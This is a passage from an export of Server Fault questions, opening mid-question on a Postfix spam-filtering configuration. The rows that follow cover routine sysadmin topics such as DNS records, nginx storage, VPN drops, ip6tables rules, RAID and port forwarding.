unknown_client_reject_code = 554
unknown_hostname_reject_code = 554
unknown_local_recipient_reject_code = 554
unknown_relay_recipient_reject_code = 554
unknown_sender_reject_code = 554
unknown_virtual_alias_reject_code = 554
unknown_virtual_mailbox_reject_code = 554
unverified_recipient_reject_code = 554
unverified_sender_reject_code = 554

smtpd_recipient_restrictions =
#check_sender_access hash:/etc/postfix/rejected-recipient
reject_invalid_hostname,
reject_unknown_recipient_domain,
reject_unauth_pipelining,
permit_mynetworks,
permit_sasl_authenticated,
reject_non_fqdn_recipient,
reject_unauth_destination,
reject_unknown_recipient_domain,
reject_rbl_client zen.spamhaus. org,
#reject_rbl_client multi.uribl. com,
reject_rbl_client dsn.rfc-ignorant. org,
reject_rbl_client dul.dnsbl.sorbs. net,
reject_rbl_client list.dsbl. org,
reject_rbl_client sbl-xbl.spamhaus. org,
reject_rbl_client bl.spamcop. net,
reject_rbl_client dnsbl.sorbs. net,
reject_rbl_client cbl.abuseat. org,
reject_rbl_client dnsbl.sorbs. net,
reject_rbl_client cbl.abuseat. org,
reject_rbl_client ix.dnsbl.manitu. net,
reject_rbl_client combined.rbl.msrbl. net,
reject_rbl_client rabl.nuclearelephant. com,
reject_rbl_client badconf.rhsbl.sorbs. net,
reject_rbl_client ix.dnsbl.manitu. net,
reject_rbl_client nomail.rhsbl.sorbs. net,
permit

smtpd_helo_restrictions =
permit_mynetworks,
permit_sasl_authenticated,
reject_invalid_helo_hostname,
reject_non_fqdn_helo_hostname
# reject_unknown_helo_hostname

smtpd_client_restrictions =
permit_mynetworks,
permit_inet_interfaces,
permit_sasl_authenticated
# reject_plaintext_session,
# reject_unauth_pipelining

smtpd_sender_restrictions =
#reject_sender_login_mismatch,
#reject_authenticated_sender_login_mismatch,
reject_unauthenticated_sender_login_mismatch,
reject_unknown_sender_domain,
permit_sasl_authenticated,
#check_sender_access hash:/etc/postfix/rejected-recipient,
reject_non_fqdn_sender
</code></pre>

<p><strong>It was working perfectly but now, the spammers use mail address :
XXXXXXX@ mywebsite . fr (instead of mywebsite . com) !</strong></p>

<p>dovecot log :</p>

<pre><code>Sep 14 10:02:15 auth-worker(10943): Info: sql(della_hall@ mywebsite . fr): unknown user
Sep 14 10:02:17 auth-worker(10943): Info: sql(joshua_spence@ mywebsite . fr): unknown user
Sep 14 10:02:18 auth-worker(10943): Info: sql(geraldine_fleming@ mywebsite . fr): unknown user
Sep 14 10:02:20 auth-worker(10943): Info: sql(genevieve_garcia@ mywebsite . fr): unknown user
Sep 14 10:02:20 auth-worker(10943): Info: sql(molly_munoz@ mywebsite . fr): unknown user
Sep 14 10:02:20 auth-worker(11073): Info: sql(jeanne_rhodes@ mywebsite . fr): unknown user
Sep 14 10:02:20 auth-worker(10943): Info: sql(samuel_barlow@ mywebsite . fr): unknown user
Sep 14 10:02:22 auth-worker(10943): Info: sql(julie_perez@ mywebsite . fr): unknown user
Sep 14 10:03:28 auth-worker(10943): Info: sql(dana_brewer@ mywebsite . fr): unknown user
Sep 14 10:03:29 auth-worker(10943): Info: sql(dana_brewer@ mywebsite . fr): unknown user
Sep 14 10:03:30 auth-worker(10943): Info: sql(dana_brewer@ mywebsite . fr): unknown user
Sep 14 10:03:31 auth-worker(10943): Info: sql(luz_newman@ mywebsite . fr): unknown user
Sep 14 10:03:33 auth-worker(10943): Info: sql(luz_newman@ mywebsite . fr): unknown user
Sep 14 10:05:01 auth-worker(11736): Info: sql(marian_mccormick@ mywebsite . fr): unknown user
Sep 14 10:05:01 auth-worker(11736): Info: sql(marian_mccormick@ mywebsite . fr): unknown user
Sep 14 10:05:03 auth-worker(11736): Info: sql(emma_welch@ mywebsite . fr): unknown user
Sep 14 10:05:03 auth-worker(11736): Info: sql(emma_welch@ mywebsite . fr): unknown user
Sep 14 10:06:51 auth-worker(11736): Info: sql(jennie_wheeler@ mywebsite . fr): unknown user
Sep 14 10:06:51 auth-worker(11736): Info: sql(samantha_porter@ mywebsite . fr): unknown user
Sep 14 10:06:51 auth-worker(11736): Info: sql(jennie_wheeler@ mywebsite . fr): unknown user
Sep 14 10:10:15 auth-worker(12510): Info: sql(lynda_little@ mywebsite . fr): unknown user
Sep 14 10:10:17 auth-worker(12510): Info: sql(deanna_salazar@ mywebsite . fr): unknown user
Sep 14 10:10:18 auth-worker(12510): Info: sql(deanna_salazar@ mywebsite . fr): unknown user
Sep 14 10:12:54 auth-worker(12871): Info: sql(candace_neal@ mywebsite . fr): unknown user
Sep 14 10:12:54 auth-worker(12871): Info: sql(suzanne_rodriguez@ mywebsite . fr): unknown user
Sep 14 10:12:54 auth-worker(12871): Info: sql(suzanne_rodriguez@ mywebsite . fr): unknown user
Sep 14 10:13:10 auth-worker(12871): Info: sql(suzanne_rodriguez@ mywebsite . fr): unknown user
Sep 14 10:13:19 auth-worker(12871): Info: sql(marsha_harris@ mywebsite . fr): unknown user
Sep 14 10:13:21 auth-worker(12871): Info: sql(marsha_harris@ mywebsite . fr): unknown user
Sep 14 10:13:21 auth-worker(12871): Info: sql(marsha_harris@ mywebsite . fr): unknown user
Sep 14 10:13:22 auth-worker(12871): Info: sql(marsha_harris@ mywebsite . fr): unknown user
Sep 14 10:13:26 auth-worker(12871): Info: sql(lorraine_bryant@ mywebsite . fr): unknown user
Sep 14 10:13:29 auth-worker(12871): Info: sql(lorraine_bryant@ mywebsite . fr): unknown user
Sep 14 10:13:29 auth-worker(12871): Info: sql(lorraine_bryant@ mywebsite . fr): unknown user
Sep 14 10:13:31 auth-worker(12871): Info: sql(gloria_mckinney@ mywebsite . fr): unknown user
Sep 14 10:14:32 auth-worker(13283): Info: sql(daniel_pickett@ mywebsite . fr): unknown user
Sep 14 10:14:32 auth-worker(13283): Info: sql(daniel_pickett@ mywebsite . fr): unknown user
Sep 14 10:14:33 auth-worker(13283): Info: sql(daniel_pickett@ mywebsite . fr): unknown user
</code></pre>

<p>Please, do you have any solution for me ?</p>
","<postfix><spam>","2016-09-14 20:04:12"
"1013419","How can I decide network speed of my dedicated server?","<p>I have a dedicated server managed by WHM which has 100 websites. Bandwidth is 1 Gbps.</p>

<p>I found another company which offers better CPU and RAM and HDD same price but bandwidth is 0.5 Gbps. </p>

<p>I am not good at calculating bandwidth that needed. What should I do?</p>
","<bandwidth>","2020-04-21 16:24:21"
"803170","Why are newly-created files under /root not executable even though /root is and umask is 022? Is this the default on CentOS?","<p>I am building a small set of utility <code>bash</code> functions and aliases that will live on a special <code>/root</code> partition. I've noticed that whenever I <code>touch aFile</code> or <code>vim aFile</code>, the result is <code>aFile</code> with the permissions <code>-rw-r--r--</code>.</p>

<p>This is highly undesirable if your goal is to run some shell scripts, and that's kind of what I thought the whole point of <code>/root</code> was.</p>

<p>My <code>/root</code> directory permissions are <code>dr-xr-x---</code> and my <code>umask</code> is <code>0022</code>. As I understand, I should expect new files to be <code>0755</code>... but they aren't.</p>

<ol>
<li>Why?</li>
<li>Is this the default?</li>
<li>How can I make new files executable?</li>
</ol>
","<file-permissions><umask>","2016-09-15 02:38:00"
"803182","How to setup a customised CNAME server","<p>I have a server called cname.booking.com.au.</p>

<p>I'd like to be able to create multiple other websites, that are like a customised version of cname.booking.com.au. For example I'd like to create a website called booking.updog.com.au.</p>

<p>So in my DNS settings for booking.updog.com.au I created an entry:
booking 3600 IN CNAME cname.booking.com.au.</p>

<p>I expected that when I browse booking.updog.com.au, it would produce the same content as cname.booking.com.au, with the ability to customise the look and feel so that it looks like a different website, but it doesn't work. I don't know why.</p>

<p>The only way I can see this working is if cname.booking.com.au can somehow have a Virtual Host setting somewhere that maps booking.updog.com.au to an IP address, but I don't know how.</p>

<p>Someone who has done this successfully is Campaign Monitor. Campaign Monitor has a server called cname.sendcreate.com and I have a website called email.marketingmix.com.au and in my DNS settings I have a record:
email 3600 IN cname.sendcreate.com and it works. So I think if I understood how something like cname.sendcreate.com is setup, I'd be able to answer my own question.</p>
","<virtualization><apache-2.4><cname-record><host>","2016-09-15 05:34:14"
"803197","How can i set premissions in logon script?","<p>I created a logon script which mounts a few network drives on each user account. </p>

<hr>

<p>My question is how could i permit it that when i <strong>want the give one Special user the permission to get a Network drive but other users shouldn't have the permission to get that drive</strong>.</p>

<hr>

<p>I would also like to get that all into one logon-script.</p>
","<logon-scripts>","2016-09-15 08:02:03"
"1013533","What is meant by Multi-Cloud Clustering? Can anyone help me in understanding it in detail? Any helpful articles will be highly appreciated","<p>Can someone help me in understanding what Multi-Cloud Clustering is? How can it be done and which are the best options for Multi-Cloud Clustering in the market today? Thanks. </p>
","<google-cloud-platform><cluster><cloud><failovercluster>","2020-04-22 11:25:33"
"1013555","Partitioning Mariadb small error on https://mariadb.com/kb/en/range-partitioning-type/","<p>Please correct me but I've located a small error on the Mariadb documentation on  <a href=""https://mariadb.com/kb/en/range-partitioning-type/"" rel=""nofollow noreferrer"">https://mariadb.com/kb/en/range-partitioning-type/</a></p>

<p>The second example under Use cases has a superfluous UNIX_TIMESTAMP in the PARTION BY RANGE line. As the column timestamp already is a unix timestamp UNIX_TIMESTAMP(timestamp) will not work, will it? The line should read</p>

<pre><code> PARTITION BY RANGE( TimeStamp )
</code></pre>

<p>Not sure how to get in touch with the ppl. that write the manual.</p>
","<mariadb>","2020-04-22 13:32:12"
"803272","How to set SOA Expire Value?","<p>I ran my domain through intoDNS and the report returned a warning saying</p>

<pre><code>Your SOA EXPIRE number is: 3600000. That is NOT OK
</code></pre>

<p>So I've been looking to change the value ever since. You wouldn't believe it but I couldn't find one place that tells where or how to change the value of SOA Expire. I found out the recommended range is 2-4 weeks but no clue as to where to go to change it.</p>

<p>Can anyone point me in the right direction?</p>
","<domain-name-system><dns-zone><soa-record>","2016-09-15 12:59:02"
"1013606","How is .google a domain extension?","<p>I just visited <a href=""https://blog.google/"" rel=""nofollow noreferrer"">blog.google</a>. How does that work? Can organisations register their own domain extensions? If yes, what is the procedure and how expensive is that? If not, how did they achieve the blog domain then? Is there some networking trick to this that I am missing?</p>
","<domain-name-system><domain><subdomain><domain-name>","2020-04-22 17:44:21"
"1013629","Can anyone help me on the ERR_CONNECTION_REFUSED","<p>This site can’t be reached 35.238.10.203 refused to connect.
Try:</p>

<p>Checking the connection
Checking the proxy and the firewall
ERR_CONNECTION_REFUSED</p>
","<google-cloud-platform>","2020-04-22 19:56:24"
"803323","redirecting a subdirectory to some other hosting server fluently","<p>I am hosting a server on which I would like to have a <code>/articles</code> folder.<br>
I would like to redirect all calls to this name <code>www.myserver.com/articles</code> to a wordpress that is being hosted on another server.</p>

<p>How can I do this so that the URL does not show the browser is using a different IP address?</p>
","<linux><redirect><wordpress><301-redirect><folder-redirection>","2016-09-15 15:41:36"
"803420","Does a licence for Windows Server 2016 Technical Preview expire?","<p>I have a licencing question regarding Windows Server 2016 Technical Preview 5</p>

<p>I am contemplating which server OS would be the best option for me and a VPS host I've found offers the above as an option.</p>

<p>My question is, does the licence for that server version expire and I have to upgrade once Windows Server 2016 is fully ""fledged"" and released? Or will my server instance upgrade itself with each technical preview release and then finally to the full release and keep the same licence?</p>

<p>thank you!</p>
","<windows><upgrade>","2016-09-16 02:02:14"
"803470","Add two or more domains to one public IP using A records","<p>I have a public IP address that houses two applications e.g 197.18.2.48 houses 192.18.2.48/systems and 192.18.2.48/shop , I would like to map this two applications to my domain so that it reads </p>

<pre><code>192.18.2.48/systems  -&gt; systems.harris-dindi.com 
192.18.2.48/shop -&gt; shop.harris-dindi.com
</code></pre>

<p>So the two systems with IP on the  left  should point to the subdomains on the right. I have tried using A records from the cpanel but it only accepts the  IP Address. 
Please advise</p>
","<domain-name-system><subdomain><domain-name><a-record>","2016-09-16 09:08:40"
"803479","soft link to non existant server?","<p>I inherited a bunch of xls files and a dts that imports them all into sql.
the server the dts is looking for no longer exists (FS1)</p>

<p>Any kind soul knows a way to make that any petition to FS1(non existant) is somewhat redirected to new server (NEWFS)? (without renaming NEWFS)
if not I guess I will have to replace paths in dts but I was hoping to avoid that.</p>

<p>Thank you in advance</p>
","<samba>","2016-09-16 09:33:33"
"803492","how to transfer a website between two host","<p>i want to change my website host(linux) and I need to transfer flies from my old host to the new one I've zipped my site content into a backup file and now I want to upload this file to my new host how can I do that?
<br>
PS:
I have tried this solution but I got 504 time-out error:<br></p>

<pre><code> file_put_contents('backup.tar.gz', file_get_contents('http://hiva.com:2082/cpsess5550968018/download?skipencode=1&amp;file=%2fhome%2fhivarobotics%2fpublic_ftp%2fbackup.tar.gz'));
</code></pre>

<p>TNX:)</p>
","<linux><ftp><hosting><host>","2016-09-16 10:14:08"
"803535","Two branches connect without vpn appliance","<p>i have one issue to connect a two location in different city together to transfer a file and RDP all machine use WIN 7 OS , i have one idea to install two appliance VPN but on this case there is any solution to connect between these branche without using any VPN appliance ??</p>

<p>Note: in all location i use 4 pc's almost.</p>

<p>Thank you.</p>
","<vpn><site-to-site-vpn>","2016-09-16 13:10:07"
"803656","How can i add a second drive to nginx server?","<p>I have a server having two drives each of 2TB. First drive is mounted to ""root"" (which is called ""/"") and the second drive is mounted to /mnt/disk1. I am serving my files from first hard drive at location /usr/share/nginx/html/downloads/ with this default configuration below:</p>

<p>server {
    listen 80 default_server;
    listen [::]:80 default_server ipv6only=on;</p>

<pre><code>root /usr/share/nginx/html;   &lt;---------------default served file location
index index.html index.htm;
server_name localhost;

location / {
    try_files $uri $uri/ =404;      
    }    
</code></pre>

<p>}</p>

<p>My files can be downloaded at <a href=""http://ip_address/downloads/softwares/example.exe"">http://ip_address/downloads/softwares/example.exe</a></p>

<p>Now my first 2TB hard drive is filled and i dont have budget to buy another server. But i have another 2TB of hard drive having all of its 2TBfree space mounted at /mnt/disk1. </p>

<p>Can you please tell me how can i tell nginx to include that 2TB drive so that i can put and serve files from this 2TB drive at location /mnt/disk1</p>
","<ubuntu><nginx><web-server><ubuntu-14.04>","2016-09-16 23:01:45"
"1014064","When two different companies of hard disks can be raid together?","<p>I'm trying to replace the hard disk due to the aging of the server computer. Currently, the server computer is composed of two 2tb hard disks as RAID 1. The model number of the hard disk is Seagate's st2000dm001. Will the rebuild work correctly when you rebuild with ""Western Digital WD 2TB Red WD20EFRX"" after removing one of the existing hard disks?</p>

<p>And may I use the built-in program as rebuild?
The OS is Windows Server 2008 r2.</p>
","<windows-server-2008-r2><raid1>","2020-04-25 05:40:31"
"1014066","ip6tables block thunderbird email","<p>The following ip6tables block thunderbird from retrieving email from my gmail account:</p>

<pre><code>sudo ip6tables -P FORWARD DROP
sudo ip6tables -P INPUT DROP
sudo ip6tables -P OUTPUT DROP

sudo ip6tables -A INPUT  -j ACCEPT -i lo 
sudo ip6tables -A OUTPUT -j ACCEPT -o lo 

sudo ip6tables -A INPUT  -j ACCEPT -m conntrack --ctstate ESTABLISHED,RELATED
sudo ip6tables -A OUTPUT -j ACCEPT -m conntrack --ctstate ESTABLISHED,RELATED

sudo ip6tables -A INPUT -p icmpv6 -j ACCEPT 
sudo ip6tables -A OUTPUT -p icmpv6 -j ACCEPT

sudo ip6tables -A OUTPUT -j ACCEPT -p tcp --dport 53  -m comment --comment ""DNS/TCP""
sudo ip6tables -A OUTPUT -j ACCEPT -p udp --dport 53  -m comment --comment ""DNS/UDP""
sudo ip6tables -A OUTPUT -j ACCEPT -p tcp --dport 22  -m comment --comment ""SSH secure shell""
sudo ip6tables -A OUTPUT -j ACCEPT -p tcp --dport 80  -m comment --comment ""HTTP""
sudo ip6tables -A OUTPUT -j ACCEPT -p tcp --dport 443 -m comment --comment ""HTTPS""
sudo ip6tables -A OUTPUT -j ACCEPT -p tcp --dport 110 -m comment --comment ""POP3""
sudo ip6tables -A OUTPUT -j ACCEPT -p tcp --dport 143 -m comment --comment ""IMAP""
sudo ip6tables -A OUTPUT -j ACCEPT -p tcp --dport 993 -m comment --comment ""IMAP/SSL""
sudo ip6tables -A OUTPUT -j ACCEPT -p tcp --dport 25  -m comment --comment ""SMTP""
sudo ip6tables -A OUTPUT -j ACCEPT -p tcp --dport 26  -m comment --comment ""SMTP 2nd""
sudo ip6tables -A OUTPUT -j ACCEPT -p tcp --dport 465 -m comment --comment ""SMTP/SSL""
</code></pre>

<p>Whenever I disable them, thunderbird can retrieve email fine. What am I doing wrong?</p>
","<ipv6><ip6tables>","2020-04-25 06:20:33"
"803742","How to restrict access to my server from the Tor Network AND Browser?","<p>I am working on a secure application, and for security and other purposes, I would like that people not be able to access my site via the <code>Tor Network</code> AND the <code>Tor Browser</code>.</p>

<p>I am using an server based on the <code>LAMP Stack</code> with <code>.htaccess</code> enabled.</p>

<p>Any thoughts on how I can achieve this? </p>
","<networking><permissions><.htaccess><tor>","2016-09-17 17:05:51"
"1014139","Is it really risky to upgrade from Ubuntu 10.4 to 12.04?","<p>According to this the site process is risky: <a href=""https://support.stripe.com/questions/upgrade-openssl-to-support-tls-1-2"" rel=""nofollow noreferrer"">https://support.stripe.com/questions/upgrade-openssl-to-support-tls-1-2</a></p>

<blockquote>
  <p>10.04 LTS (Lucid), you will need to upgrade to at least Ubuntu 12.04 (Precise). We recommend rebuilding your server, as the upgrade process is risky</p>
</blockquote>

<p>Is that really the case or are they being over cautious?</p>
","<ubuntu><upgrade>","2020-04-25 16:05:12"
"1014200","Purge Outlook of Emails from Deleted Items and Drafts","<p>I am looking for a powershell script to purge my email of over 185,000 emails in Deleted Items and 190,000 in Drafts. Please is there any powershell script I could use to accomplish such a task? The Email is hosted on Microsoft Outlook (Office 365), I have ransacked the internet in everyway i can, maybe I am not using the correct Keywords.</p>
","<outlook>","2020-04-26 07:23:18"
"803891","VPS (Virtual Private Server) kills JVM process when exceeds guaranteed RAM","<p>VPS:
Operating system: Ubuntu
Guaranteed RAM: 10g
Burst or Dynamic RAM: 20g</p>

<p>When exactly a VPS ( Virtual Private Server) kills the process when dedicated memory limit exceeds?
And which process gets killed and on what basis processes are filtered for killing ???</p>

<p>To make my question even more precise, I have certain scenarios. It would be helpful if you could tell me my understanding is right.</p>

<p>I can see privvmpages is set to around 20g and vmguard set to 10g. So that means, I can confirm 10g guaranteed and 20g burst memory is available.</p>

<p>Now let's take this scenario where out of 10g dedicated ram, 8g is occupied by some processes and I am going to allocate 3g to java jvm. In this case, 2g is allocated from dedicated ram and 1 g from burst ram ???. 
If so, in tight memory situation, container choose which process to kill?? In my understanding, since 1g allocated from burst ram, java jvm process gets killed ???</p>

<p>Processes that are allocated memory from dedicated ram always safe and never gets killed??? Its the process that occupies burst ram gets killed always???
Because when I allocate memory to java, though I choose xms and xmx to set initial and maximum memory, actual consumption happens when memory is needed. So if memory is allocated from dedicated ram, is jvm safe from being killed???</p>

<p>How can I make sure that I am allocating memory from dedicated ram???</p>

<p>When enough memory is available in dedicated ram, allocation always happens from dedicated ram???</p>

<p>If my above understanding is wrong and doesn't make sense, could you explain under what circumstances and which process are eligible to get killed under tight memory situations???</p>

<p>The reason why I am raising this question is,
I can see its always the jvm getting killed when memory exceeds around 15g. Its always always the jvm.
When I set initial and max memory, allocation is always successful. But when it really starts consuming memory, its this process that always getting killed.. and not touching other process...
So I want to make jvm process safe and stop from being killed all the time.</p>

<p>If I change the memory allocation order, ie jvm memory first and rest of the allocation, will it work???
Or do i have to set priority for process???</p>
","<memory><vps><openvz>","2016-09-19 04:41:52"
"803966","Tracert with Port Number","<p>I have a windows 2008 r2 server on my companies network which is locked down and only allows certain ports through for specific ip addresses. so a simple tracert will not work for what I need since it does not allow for specifying a port. 
is there any applications out there that will provide similar results as tracert but allow you to specify port?</p>

<p>I am being told that the issue I am experiencing is outside of our network when I am almost certain it is inside our network but only way to prove it is with a trace to show where the packets are being dropped at.</p>
","<networking><windows-server-2008>","2016-09-19 12:41:02"
"1014379","VPN disconnects after exactly 3 minutes and 30 seconds","<p>I have set up a vpn server using the scripts in <a href=""https://github.com/hwdsl2/setup-ipsec-vpn"" rel=""nofollow noreferrer"">https://github.com/hwdsl2/setup-ipsec-vpn</a>. </p>

<p>I am connecting from my Mac to my personal vpn running on an Ubuntu server.</p>

<p>It disconnects after 3 minutes and 30 seconds. </p>

<p>Here is what i see from Mac vpn client logs:</p>

<pre><code>tail -100f /var/log/ppp.log

Mon Apr 27 13:34:51 2020 : L2TP received StopCCN
Mon Apr 27 13:34:51 2020 : L2TP hangup
Mon Apr 27 13:34:51 2020 : ipcp: down
Mon Apr 27 13:34:51 2020 : Connection terminated.
Mon Apr 27 13:34:51 2020 : L2TP clearing port-mapping for en0
Mon Apr 27 13:34:51 2020 : Connect time 2.6 minutes.
Mon Apr 27 13:34:51 2020 : Sent 1028457 bytes, received 5762343 bytes.
Mon Apr 27 13:34:51 2020 : L2TP disconnecting...
Mon Apr 27 13:34:51 2020 : L2TP sent CDN
Mon Apr 27 13:34:51 2020 : L2TP sent StopCCN
Mon Apr 27 13:34:51 2020 : L2TP disconnected
</code></pre>

<p>Here is what i see on the server side:</p>

<pre><code>tail -f /var/log/auth.log

Apr 27 10:34:20 ip-172-31-40-152 pluto[3459]: ""l2tp-psk""[2] 149.0.138.78 #1: IKEv1 DPD action - clearing connection kind CK_INSTANCE
Apr 27 10:34:20 ip-172-31-40-152 pluto[3459]: ""l2tp-psk"" #2: deleting state (STATE_QUICK_R2) aged 120.084s and sending notification
Apr 27 10:34:20 ip-172-31-40-152 pluto[3459]: ""l2tp-psk"" #2: ESP traffic information: in=1MB out=6MB
Apr 27 10:34:20 ip-172-31-40-152 pluto[3459]: ""l2tp-psk"" #1: deleting state (STATE_MAIN_R3) aged 121.125s and sending notification
Apr 27 10:34:20 ip-172-31-40-152 pluto[3459]: ""l2tp-psk""[2] 149.0.138.78: deleting connection ""l2tp-psk""[2] 149.0.138.78 instance with peer 149.0.138.78 {isakmp=#0/ipsec=#0}


tail -f /var/log/syslog

Apr 27 10:52:03 ip-172-31-40-152 xl2tpd[3043]: Maximum retries exceeded for tunnel 39830.  Closing.
Apr 27 10:52:03 ip-172-31-40-152 pppd[4266]: Modem hangup
Apr 27 10:52:03 ip-172-31-40-152 systemd-networkd[700]: ppp0: Link DOWN
Apr 27 10:52:03 ip-172-31-40-152 pppd[4266]: Connect time 3.6 minutes.
Apr 27 10:52:03 ip-172-31-40-152 systemd-networkd[700]: ppp0: Lost carrier
Apr 27 10:52:03 ip-172-31-40-152 pppd[4266]: Sent 94682 bytes, received 107101 bytes.
Apr 27 10:52:03 ip-172-31-40-152 systemd-timesyncd[526]: Network configuration changed, trying to establish connection.
Apr 27 10:52:03 ip-172-31-40-152 xl2tpd[3043]: Terminating pppd: sending TERM signal to pid 4266
Apr 27 10:52:03 ip-172-31-40-152 xl2tpd[3043]: Connection 24 closed to 149.0.138.78, port 59243 (Timeout)
Apr 27 10:52:03 ip-172-31-40-152 pppd[4266]: Connection terminated.
Apr 27 10:52:03 ip-172-31-40-152 pppd[4266]: Exit.
Apr 27 10:52:03 ip-172-31-40-152 systemd-timesyncd[526]: Synchronized to time server 91.189.91.157:123 (ntp.ubuntu.com).
</code></pre>

<p>The server runs on AWS. I tried changing server IP address, recreating the server from the image. But they didn't work. </p>

<p>(!) I used to connect the vpn server without hassle before. After I changed my ISP, I started to have this problem. ISP support has no idea about the issue. </p>

<p>What could be wrong with the setup?</p>
","<networking><vpn><openvpn><ipsec>","2020-04-27 11:30:23"
"1014416","Correctly point DNS to subdomain from cloudflare to cpanel server?","<p>I have a CPANEL server hosting some websites and webmails, a couple of days ago I was asked to add SSL security to this websites and decided to use cloud flare to do this. So I added the domain in cloud flare and automatically imported the DNS records that CF detected.</p>

<p>So the home page and emails are working like a charm, the problem is with a landing page accesible from a subdomain:</p>

<p>corporativo.conceptlounge.mx</p>

<p>If I try to access this page using <strong>www.</strong> it just doesn't loads. And some people can't load it from certain places (different networks).</p>

<p>My DNS records on CPANEL are:</p>

<p><a href=""https://i.sstatic.net/4Q8fY.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/4Q8fY.png"" alt=""""></a></p>

<p>And 19 more records but those are related to mail, cpanel, auto discover, etc.</p>

<p>And this is how Im trying to use them in cloud flare, I had to manually add subdomain records cause they didn't add automatically:</p>

<p><a href=""https://i.sstatic.net/RAxZx.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/RAxZx.png"" alt=""""></a></p>
","<domain-name-system><subdomain><cloudflare><cpanel>","2020-04-27 15:11:20"
"804057","Information Security - USB Drives","<p>I have to perform a user information security awareness audit. One of the things is to determine if user's plug in a USB device or not.</p>

<p>My first ideal was to have it run a auto run program that has a bat file that records, their username, pc name, and date/time into a txt log file. </p>

<p>Determining that this was a no go, I have decided to maybe try to run the bat file when the pc determines when the drive is plugged in?</p>

<p>Is there any other options?</p>
","<security><usb><physical-security>","2016-09-19 18:15:26"
"804123","4+ IP Address On New Network","<p>So I just upgraded my ISP, and I went to set up the DMZ for the network.
Upon setting the IPv6 DMZ, I ran <code>ipconfig</code> in CMD and this was the output:</p>

<pre><code>Connection-specific DNS Suffix  . : hsd1.or.comcast.net
IPv6 Address. . . . . . . . . . . : 2601:1c0:8802:236::70c7
IPv6 Address. . . . . . . . . . . : 2601:1c0:8802:236:6d29:22a6:b361:9f14
Temporary IPv6 Address. . . . . . : 2601:1c0:8802:236:1188:5bd:ada9:3be6
Link-local IPv6 Address . . . . . : fe80::6d29:22a6:b361:9f14%4
IPv4 Address. . . . . . . . . . . : 192.168.0.234
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : fe80::48f7:c0ff:fe22:1d46%4
                                   192.168.0.1
</code></pre>

<p>Now of course I know what most of the stuff on here means, but why do I have 4 IPv6 Addresses for my local machine?</p>

<p>What is the difference between the normal IPv6, Temporary &amp; Link-Local? And why do I have 2 normal local IPv6 addresses / which one do I set for my IPv6 DMZ?</p>
","<ip><ipv6><link-local><ipconfig>","2016-09-20 01:55:53"
"1014508","Login into a headless VirtualBox VM that has no internet","<p>I need to start a VirtualBox machine in headless mode and login into it. However, this VM can not have internet so I can not make ssh to this machine. Is there a way to do this login from the command line? The interface is too slow.</p>

<p>Thanks</p>
","<virtualbox>","2020-04-28 01:39:55"
"1014639","why use both web servers and application servers in the same architecture?","<p>I understand the difference between the two, but I don't understand why you would use both. What is the point of separating the work between the two types of servers and increasing the amount of network calls. </p>
","<web-server><application-server>","2020-04-28 15:32:57"
"1014880","Hyper-V VM on workstation connected via Check Point VPN","<p>I have a windows 10 laptop running a Hyper-V VM. I need the VM to connect to the corporate domain.</p>

<p>Because I'm working from home,  My laptop is connected using Check Point VPN.</p>

<p>If I use the Default Switch., which is set for as internal, I get very slow access to Internet connection from  VM but does not go through the VPN tunnel so I can't contact the domain controller.</p>

<p>If I create a new virtual external switch, connected to my wireless adapter, I get access to Internet connection from VM but does not go through the VPN tunnel so I can't contact the domain controller.</p>

<p>If I create a new virtual external switch, connected to check point virtual adapter, I lose all connectivity to my laptop entirely.</p>

<p>Is this possible?</p>
","<vpn><hyper-v>","2020-04-29 21:51:20"
"1014899","Port forward to one of multiple devices depending on which one is connected?","<p>I'm running <strong>FreshTomato Firmware 2020.2 K26ARM USB AIO-64K</strong> but this question is generally about ""advanced use cases"" of port forwarding.</p>

<p>Is it possible to set up router policies so that traffic coming in on a specific port on the WAN is forwarded to one of multiple (two in my case) devices (IP addresses), depending on which one is currently connected to the router (is not turned off)?</p>

<p>To give a concrete example, let's say I have a <strong>PS3</strong> (192.168.1.<strong>3</strong>) and a <strong>PS4</strong> (192.168.1.<strong>4</strong>).
PSN sends traffic on ports 3478-3480. I'm expecting an inbound connection to be established on these ports so I want to set up a rule:</p>

<ul>
<li>If PS3 is connected and traffic is received on [WAN_IP]:<strong>3478</strong>, route packets to 192.168.1.<strong>3:3478</strong></li>
<li>If PS4 is connected ..., route packets to 192.168.1.<strong>4:3478</strong></li>
<li>ditto for ports 3479,3480 and whatever arbitrary set of ports I define</li>
<li>If both PS3 and PS4 are connected, then <strong>fallback</strong> on routing it to PS4</li>
</ul>

<p>I would find it hard to believe that this kind of routing logic can't be implemented.  </p>

<p>And yes, I know that typically there has to be a many-to-one mapping between incoming connections on the WAN port to LAN device port, and I want something like a many-to-multiple mapping which is dependent on checking certain conditions and route accordingly with a fallback route. Think of it as a ""switch statement"" for routing.<br>
I'm simply looking for a way to <strong>practically solve my specific problem</strong> with routing (<strong><em>doesn't necessarily have to be port forwarding</em></strong>).</p>
","<networking><router><port-forwarding>","2020-04-30 00:39:27"
"1014915","RAID configuration HPE Proliant DL360 G6","<p>I've got an old server and I would like some advice on the RAID configuration. I have 8 disks of 300GB.
And I'm not sure which setup is more desirable.</p>

<ul>
<li>2x RAID1 (os: hyper-V)</li>
<li>6x RAID5 (VMs)</li>
</ul>

<p>or</p>

<ul>
<li><p>8x RAID5 </p>

<ul>
<li>If I choose for 8x RAID5, will the host OS see it as one disk or can that be changed in the Array Controller? </li>
<li>Is partitioning in the host OS desirable?</li>
</ul></li>
</ul>
","<raid><hyper-v><hpe>","2020-04-30 05:55:18"
"804851","Hacking attempt from Googlebot","<p>Today I found this in my server log:</p>

<blockquote>
  <p>66.249.64.140 crawl-66-249-64-140.googlebot.com [22/Sep/2016:11:23:30 +0300] ""GET /C/Users/%EF%BF%BD%C3%8A/Documents/%EF%BF%BD%EF%BF%BD%EF%BF%BD%C3%AF/Documents/26.05.2013/Major%2026.05.2013/Listpub+/No%2012,%20juin%202009
  HTTP/1.1"" 302 227 ""-"" ""Mozilla/5.0 (compatible; Googlebot/2.1;
  +<a href=""http://www.google.com/bot.html"" rel=""nofollow noreferrer"">http://www.google.com/bot.html</a>)"" ""text/html""</p>
</blockquote>

<p>I can't even correctly unescape the coded part of request... Help, please.
How do you think, is it a hacking attempt?</p>

<p>PS. I ported this topic from stackoverflow by recommendation. Sorry I didn't know about such gradation of questions here.</p>
","<hacking>","2016-09-23 05:12:48"
